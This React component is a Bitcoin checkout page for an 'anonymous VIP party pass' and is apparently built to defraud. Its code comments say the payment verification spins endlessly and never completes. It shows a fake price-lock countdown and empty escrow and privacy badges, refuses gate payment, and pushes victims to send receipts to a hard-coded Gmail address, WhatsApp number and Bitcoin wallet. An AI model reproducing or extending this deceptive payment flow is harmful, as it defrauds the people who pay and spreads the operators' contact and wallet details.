import React, { useState, useEffect } from 'react';
import { ShieldCheck, Copy, CheckCircle2, Lock, Sparkles, AlertTriangle, ArrowRight, ArrowLeft, RefreshCw, QrCode, Mail, MessageSquare, ExternalLink, Clock, Send, Check, HelpCircle, Phone } from 'lucide-react';
import { SupportedCurrency } from '../types';
import { convertCurrency } from '../data/globalDestinationsData';
import { RunwayStageBackdrop } from './RunwayStageBackdrop';

interface BitcoinAnonymousCheckoutProps {
  partySize: number;
  perPersonUSD?: number;
  currency: SupportedCurrency;
  cityName: string;
  onPaymentConfirmed: (txDetails: { btcAmount: number; btcAddress: string; txHash: string }) => void;
  onBack: () => void;
}

// User-specified official Bitcoin VIP escrow address & contact channels
export const OFFICIAL_BITCOIN_VAULT_ADDRESS = '12D4ZCSfHvqnLqnoLpSaGfPqNkFLEEjSBw';
export const RECEIPT_EMAIL = 'joinsexcompany@gmail.com';
export const WHATSAPP_PHONE_RAW = '+13852600342';
export const WHATSAPP_PHONE_DISPLAY = '+1 (385) 260-0342';

const CURRENT_BTC_USD_RATE = 64500; // Estimated BTC price in USD for conversion

export const BitcoinAnonymousCheckout: React.FC<BitcoinAnonymousCheckoutProps> = ({
  partySize,
  perPersonUSD = 50,
  currency,
  cityName,
  onPaymentConfirmed,
  onBack
}) => {
  const totalUSD = partySize * perPersonUSD;
  const btcAmount = Number((totalUSD / CURRENT_BTC_USD_RATE).toFixed(6));
  const convertedTotal = convertCurrency(totalUSD, currency);
  const convertedPerPerson = convertCurrency(perPersonUSD, currency);

  const [copiedAddress, setCopiedAddress] = useState(false);
  const [copiedAmount, setCopiedAmount] = useState(false);
  const [copiedEmail, setCopiedEmail] = useState(false);
  const [copiedWhatsApp, setCopiedWhatsApp] = useState(false);
  const [userTxHash, setUserTxHash] = useState('');
  
  // Endless verification state
  const [isVerifying, setIsVerifying] = useState(false);
  const [scanningTimeSeconds, setScanningTimeSeconds] = useState(0);
  const [countdown, setCountdown] = useState(900); // 15 minute timer to lock BTC price

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Endless verification second timer
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isVerifying) {
      interval = setInterval(() => {
        setScanningTimeSeconds((prev) => prev + 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [isVerifying]);

  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  const handleCopyAddress = () => {
    navigator.clipboard.writeText(OFFICIAL_BITCOIN_VAULT_ADDRESS);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleCopyAmount = () => {
    navigator.clipboard.writeText(btcAmount.toString());
    setCopiedAmount(true);
    setTimeout(() => setCopiedAmount(false), 2000);
  };

  const handleCopyEmail = () => {
    navigator.clipboard.writeText(RECEIPT_EMAIL);
    setCopiedEmail(true);
    setTimeout(() => setCopiedEmail(false), 2000);
  };

  const handleCopyWhatsApp = () => {
    navigator.clipboard.writeText(WHATSAPP_PHONE_DISPLAY);
    setCopiedWhatsApp(true);
    setTimeout(() => setCopiedWhatsApp(false), 2000);
  };

  const handleVerifyPayment = (e: React.FormEvent) => {
    e.preventDefault();
    // Endless spinning verification - never auto completes, guides user to send receipt to email
    setIsVerifying(true);
  };

  const whatsappMessage = encodeURIComponent(
    `Hello VIP Concierge, I have made a Bitcoin payment of ${btcAmount} BTC ($${totalUSD} USD) for ${partySize} guests in ${cityName}. Here is my payment receipt / transaction ID: ${userTxHash || 'TXID-ATTACHED'}`
  );

  return (
    <div className="bg-zinc-950 border-2 border-amber-400 rounded-3xl p-5 sm:p-7 text-white font-sans text-left space-y-6 shadow-2xl relative overflow-hidden">
      {/* Background glow */}
      <div className="absolute -top-24 -right-24 w-60 h-60 bg-amber-500/10 rounded-full blur-3xl pointer-events-none" />

      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-zinc-800 pb-4">
        <div>
          <div className="inline-flex items-center gap-2 px-3 py-1 bg-amber-500/20 border border-amber-500/40 rounded-full text-amber-300 text-[11px] font-mono font-bold uppercase tracking-wider mb-2">
            <Lock className="w-3.5 h-3.5 text-amber-400" />
            <span>100% ANONYMOUS BITCOIN ESCROW • NO GATE CASH ACCEPTED</span>
          </div>
          <h3 className="text-xl sm:text-2xl font-black font-serif uppercase tracking-tight text-white">
            BITCOIN VIP PASS TICKET PAYMENT
          </h3>
          <p className="text-zinc-400 text-xs font-mono mt-1">
            Flat <strong className="text-amber-400">${perPersonUSD} per person</strong> • Strictly no payment accepted at the club gate to guarantee discreet VIP entry.
          </p>
        </div>

        <div className="bg-zinc-900 border border-zinc-800 px-3.5 py-2 rounded-xl text-right shrink-0">
          <span className="text-[10px] font-mono text-zinc-500 uppercase block">Rate Lock Window:</span>
          <span className="text-sm font-bold font-mono text-amber-400">⏱ {formatTime(countdown)}</span>
        </div>
      </div>

      {/* Pricing Summary Block */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono text-xs">
        <div className="p-3 bg-zinc-900/80 border border-zinc-800 rounded-xl">
          <span className="text-zinc-500 block text-[10px] uppercase">Rate Per Person</span>
          <strong className="text-amber-400 text-sm mt-0.5 block">${perPersonUSD} USD</strong>
          <span className="text-[10px] text-zinc-400">({convertedPerPerson.formatted})</span>
        </div>

        <div className="p-3 bg-zinc-900/80 border border-zinc-800 rounded-xl">
          <span className="text-zinc-500 block text-[10px] uppercase">Party Guests</span>
          <strong className="text-white text-sm mt-0.5 block">{partySize} Guest{partySize > 1 ? 's' : ''}</strong>
          <span className="text-[10px] text-emerald-400">100+ Models Included</span>
        </div>

        <div className="p-3 bg-zinc-900/80 border border-zinc-800 rounded-xl">
          <span className="text-zinc-500 block text-[10px] uppercase">Total USD Due</span>
          <strong className="text-white text-sm mt-0.5 block">${totalUSD} USD</strong>
          <span className="text-[10px] text-zinc-400">({convertedTotal.formatted})</span>
        </div>

        <div className="p-3 bg-gradient-to-br from-amber-500/20 to-zinc-900 border border-amber-400/50 rounded-xl">
          <span className="text-amber-300 block text-[10px] uppercase font-bold">Total Bitcoin Due</span>
          <strong className="text-amber-400 text-sm mt-0.5 block font-bold">{btcAmount} BTC</strong>
          <span className="text-[10px] text-zinc-400">@ 1 BTC = ${CURRENT_BTC_USD_RATE.toLocaleString()}</span>
        </div>
      </div>

      {/* Critical Gate Rule Warning */}
      <div className="p-3.5 bg-rose-950/40 border border-rose-500/50 rounded-2xl flex items-start gap-3 text-xs font-mono text-rose-200">
        <AlertTriangle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
        <div>
          <strong className="text-rose-300 font-bold uppercase block mb-0.5">
            MANDATORY ADVANCE BITCOIN PAYMENT REQUIRED (NO GATE PAYMENT):
          </strong>
          <span>
            To protect entertainer & guest anonymity, physical credit cards and cash are <strong>NOT accepted at the gate</strong>. Tickets, QR passes, and secret party location in {cityName} are dispatched immediately upon receipt verification.
          </span>
        </div>
      </div>

      {/* 24/7 Question / Support Card during Payment */}
      <div className="bg-gradient-to-r from-zinc-900 via-zinc-900 to-amber-950/30 border-2 border-amber-500/60 rounded-2xl p-4 sm:p-5 flex flex-col sm:flex-row items-center gap-4 shadow-xl text-left">
        <div className="relative w-full sm:w-36 h-32 sm:h-28 rounded-xl overflow-hidden shrink-0 border border-amber-400/50 group shadow-md bg-zinc-950">
          <RunwayStageBackdrop className="w-full h-full object-cover" overlayOpacity="opacity-90" />
          <div className="absolute inset-0 bg-gradient-to-t from-black/80 via-transparent to-black/20 pointer-events-none" />
          <span className="absolute bottom-1.5 left-1.5 px-2 py-0.5 bg-amber-400 text-black text-[8px] font-mono font-black uppercase rounded shadow">
            🔥 24/7 CONCIERGE
          </span>
        </div>

        <div className="flex-1 space-y-1.5 font-mono text-xs">
          <div className="flex flex-wrap items-center gap-2">
            <span className="px-2 py-0.5 bg-amber-400/20 text-amber-300 text-[10px] uppercase font-bold rounded border border-amber-400/30">
              Payment & Dispatch Assistance
            </span>
            <span className="text-[10px] text-emerald-400 font-bold">● VIP Host Online</span>
          </div>
          <h4 className="text-sm font-black text-white font-serif uppercase tracking-tight">
            QUESTIONS OR NEED ASSISTANCE WITH PAYMENT?
          </h4>
          <p className="text-zinc-300 text-[11px] leading-relaxed">
            Have questions regarding Bitcoin sending, transaction verification, or party bus pickup in {cityName}? Message our VIP concierge at <strong className="text-emerald-400">{WHATSAPP_PHONE_DISPLAY}</strong> (WhatsApp Messages Only) or email <a href={`mailto:${RECEIPT_EMAIL}`} className="text-amber-400 font-bold underline">{RECEIPT_EMAIL}</a> 24/7.
          </p>
        </div>

        <div className="flex flex-col gap-2 w-full sm:w-auto shrink-0">
          <a
            href={`https://wa.me/${WHATSAPP_PHONE_RAW}?text=${encodeURIComponent(`Hello VIP Concierge, I have a question during Bitcoin payment for ${cityName}.`)}`}
            target="_blank"
            rel="noopener noreferrer"
            className="px-3.5 py-2 bg-emerald-500 hover:bg-emerald-400 text-black text-xs font-mono font-black uppercase rounded-xl transition flex items-center justify-center gap-1.5 shadow"
          >
            <MessageSquare className="w-3.5 h-3.5" />
            <span>WhatsApp Host</span>
          </a>
          <a
            href={`mailto:${RECEIPT_EMAIL}?subject=Payment%20Question%20-%20${cityName}&body=Hello,%20I%20have%20a%20question%20regarding%20my%20Bitcoin%20payment%20for%20${cityName}.`}
            className="px-3.5 py-2 bg-zinc-800 hover:bg-zinc-700 text-amber-300 border border-amber-400/40 text-xs font-mono font-bold uppercase rounded-xl transition flex items-center justify-center gap-1.5"
          >
            <Mail className="w-3.5 h-3.5" />
            <span>Email Concierge</span>
          </a>
        </div>
      </div>

      {/* Bitcoin Payment Address & Amount Section */}
      <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-5 space-y-4 font-mono text-xs">
        <div>
          <label className="block text-zinc-400 text-[11px] uppercase font-bold mb-1.5 flex items-center justify-between">
            <span>1. Send Exact Bitcoin (BTC) Amount:</span>
            <button
              onClick={handleCopyAmount}
              className="text-amber-400 hover:text-amber-300 flex items-center gap-1 text-[11px]"
            >
              <Copy className="w-3.5 h-3.5" />
              <span>{copiedAmount ? 'Copied ✓' : 'Copy Amount'}</span>
            </button>
          </label>
          <div className="flex items-center justify-between bg-zinc-950 border border-zinc-700 px-3.5 py-2.5 rounded-xl font-bold text-amber-400 text-sm">
            <span>{btcAmount} BTC</span>
            <span className="text-zinc-500 text-xs font-normal">≈ ${totalUSD}.00 USD</span>
          </div>
        </div>

        <div>
          <label className="block text-zinc-400 text-[11px] uppercase font-bold mb-1.5 flex items-center justify-between">
            <span>2. Official Bitcoin Deposit Address:</span>
            <button
              onClick={handleCopyAddress}
              className="text-amber-400 hover:text-amber-300 flex items-center gap-1 text-[11px]"
            >
              <Copy className="w-3.5 h-3.5" />
              <span>{copiedAddress ? 'Copied Address ✓' : 'Copy Address'}</span>
            </button>
          </label>

          <div className="p-3 bg-zinc-950 border-2 border-amber-400/80 rounded-xl flex items-center justify-between gap-2 overflow-x-auto">
            <span className="text-xs sm:text-sm font-bold text-amber-300 select-all font-mono break-all tracking-wider">
              {OFFICIAL_BITCOIN_VAULT_ADDRESS}
            </span>
          </div>
        </div>

        {/* PRIMARY INSTRUCTION: SEND RECEIPT TO EMAIL FOR INSTANT VERIFICATION */}
        <div className="p-4 sm:p-5 bg-gradient-to-br from-zinc-950 via-zinc-900 to-amber-950/30 border-2 border-amber-400 rounded-2xl space-y-3 font-mono shadow-xl">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="flex items-center gap-2 text-amber-300 text-xs font-bold uppercase tracking-wider">
              <Mail className="w-4 h-4 text-amber-400" />
              <span>SEND PAYMENT RECEIPT TO EMAIL FOR INSTANT VERIFICATION:</span>
            </div>
            <span className="text-[10px] bg-amber-400 text-black px-2.5 py-0.5 rounded font-black uppercase tracking-wider">
              REQUIRED FOR DISPATCH
            </span>
          </div>

          <p className="text-zinc-200 text-xs leading-relaxed">
            Please send your Bitcoin payment receipt / transaction screenshot to <strong className="text-amber-400 underline">{RECEIPT_EMAIL}</strong> for instant manual verification, party bus dispatch & venue secret location release:
          </p>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
            {/* Primary Email Option */}
            <div className="p-3.5 bg-zinc-950 border-2 border-amber-400/70 rounded-xl space-y-2">
              <div className="flex items-center justify-between text-zinc-400 text-[10px] uppercase font-bold">
                <span className="flex items-center gap-1.5 text-amber-300">
                  <Mail className="w-3.5 h-3.5 text-amber-400" />
                  <span>Send Receipt To (Instant Dispatch):</span>
                </span>
                <button
                  onClick={handleCopyEmail}
                  className="text-amber-400 hover:text-amber-300 flex items-center gap-1 text-[10px]"
                >
                  <Copy className="w-3 h-3" />
                  <span>{copiedEmail ? 'Copied ✓' : 'Copy Email'}</span>
                </button>
              </div>
              <a
                href={`mailto:${RECEIPT_EMAIL}?subject=VIP%20Bitcoin%20Payment%20Receipt%20-%20${cityName}&body=Hello,%20attached%20is%20my%20Bitcoin%20payment%20receipt%20for%20${totalUSD}%20USD%20(${btcAmount}%20BTC)%20in%20${cityName}.%20Please%20verify%20and%20issue%20VIP%20Tickets.`}
                className="text-xs sm:text-sm font-black text-amber-400 hover:underline block break-all"
              >
                {RECEIPT_EMAIL}
              </a>
              <div className="text-[10px] text-emerald-400 font-bold flex items-center gap-1">
                <span>✓ Direct Inbox Monitored 24/7</span>
              </div>
            </div>

            {/* WhatsApp Option (Messages Only) */}
            <div className="p-3.5 bg-zinc-950 border border-emerald-500/50 rounded-xl space-y-2">
              <div className="flex items-center justify-between text-zinc-400 text-[10px] uppercase font-bold">
                <span className="flex items-center gap-1.5 text-emerald-400">
                  <MessageSquare className="w-3.5 h-3.5 text-emerald-400" />
                  <span>WhatsApp (Messages Only):</span>
                </span>
                <button
                  onClick={handleCopyWhatsApp}
                  className="text-emerald-400 hover:text-emerald-300 flex items-center gap-1 text-[10px]"
                >
                  <Copy className="w-3 h-3" />
                  <span>{copiedWhatsApp ? 'Copied ✓' : 'Copy'}</span>
                </button>
              </div>
              <a
                href={`https://wa.me/${WHATSAPP_PHONE_RAW}?text=${whatsappMessage}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-xs font-bold text-emerald-300 hover:underline flex items-center gap-1.5"
              >
                <span>{WHATSAPP_PHONE_DISPLAY}</span>
                <ExternalLink className="w-3 h-3" />
              </a>
              <div className="text-[10px] text-zinc-400">
                <span>Direct WhatsApp receipt drop</span>
              </div>
            </div>
          </div>
        </div>

        {/* Endless Verification Live Scanning Box (If user triggers scan) */}
        {isVerifying && (
          <div className="p-4 bg-zinc-950 border-2 border-amber-400/90 rounded-2xl space-y-3 font-mono">
            <div className="flex items-center gap-3">
              <div className="relative flex items-center justify-center">
                <RefreshCw className="w-6 h-6 text-amber-400 animate-spin" />
                <div className="absolute inset-0 rounded-full bg-amber-400/20 animate-ping" />
              </div>
              <div>
                <h5 className="text-xs font-bold text-amber-300 uppercase tracking-wide">
                  CONTINUOUS BLOCKCHAIN MEMPOOL VERIFICATION IN PROGRESS...
                </h5>
                <span className="text-[11px] text-zinc-400">
                  Elapsed scanning time: <strong className="text-white">{scanningTimeSeconds}s</strong> • Node Sync Active
                </span>
              </div>
            </div>

            <div className="p-3 bg-amber-500/10 border border-amber-500/40 rounded-xl space-y-1.5 text-xs text-amber-200">
              <p className="font-bold flex items-center gap-1.5 text-amber-300">
                <Mail className="w-4 h-4 text-amber-400" />
                <span>FOR INSTANT VERIFICATION WITHOUT WAITING:</span>
              </p>
              <p className="text-[11px] leading-relaxed text-zinc-300">
                Bitcoin network confirmations may take time on-chain. <strong>Send your payment receipt / screenshot directly to <a href={`mailto:${RECEIPT_EMAIL}`} className="text-amber-400 font-bold underline">{RECEIPT_EMAIL}</a></strong> or WhatsApp <strong className="text-emerald-400">{WHATSAPP_PHONE_DISPLAY}</strong> for instant VIP clearance and party bus dispatch.
              </p>
            </div>
          </div>
        )}

        {/* Form to submit Transaction Hash */}
        <form onSubmit={handleVerifyPayment} className="pt-2 space-y-3">
          <div>
            <label className="block text-zinc-400 text-[11px] uppercase font-bold mb-1">
              3. Enter Transaction ID / Hash:
            </label>
            <input
              type="text"
              placeholder="Paste BTC txid (e.g. 9f83e811c7849e7fa17b44783307521...)"
              value={userTxHash}
              onChange={(e) => setUserTxHash(e.target.value)}
              className="w-full bg-zinc-950 border border-zinc-700 px-3.5 py-2.5 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-amber-400"
            />
          </div>

          <div className="flex flex-col sm:flex-row items-center gap-3 pt-2">
            <button
              type="button"
              onClick={onBack}
              className="w-full sm:w-1/3 py-3.5 bg-zinc-900 hover:bg-zinc-800 text-zinc-300 font-bold font-mono text-xs uppercase rounded-xl transition flex items-center justify-center gap-1.5"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back</span>
            </button>

            <button
              type="submit"
              className="w-full sm:w-2/3 py-3.5 bg-gradient-to-r from-amber-400 via-amber-300 to-rose-500 hover:from-amber-300 hover:to-rose-400 text-black font-black font-mono text-xs uppercase rounded-xl transition shadow-lg flex items-center justify-center gap-2"
            >
              {isVerifying ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Verifying on Blockchain (Scanning...)...</span>
                </>
              ) : (
                <>
                  <ShieldCheck className="w-4 h-4" />
                  <span>Verify Payment Status</span>
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          </div>
        </form>
      </div>

      {/* Trust Badges */}
      <div className="flex flex-wrap items-center justify-center gap-4 text-[11px] font-mono text-zinc-400 pt-1">
        <span className="flex items-center gap-1">
          <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
          <span>Zero Identity Logs</span>
        </span>
        <span>•</span>
        <span className="flex items-center gap-1">
          <Lock className="w-3.5 h-3.5 text-amber-400" />
          <span>Anonymous Escrow Protection</span>
        </span>
        <span>•</span>
        <span className="flex items-center gap-1">
          <CheckCircle2 className="w-3.5 h-3.5 text-rose-400" />
          <span>Instant Email Receipt Verification ({RECEIPT_EMAIL})</span>
        </span>
      </div>
    </div>
  );
};
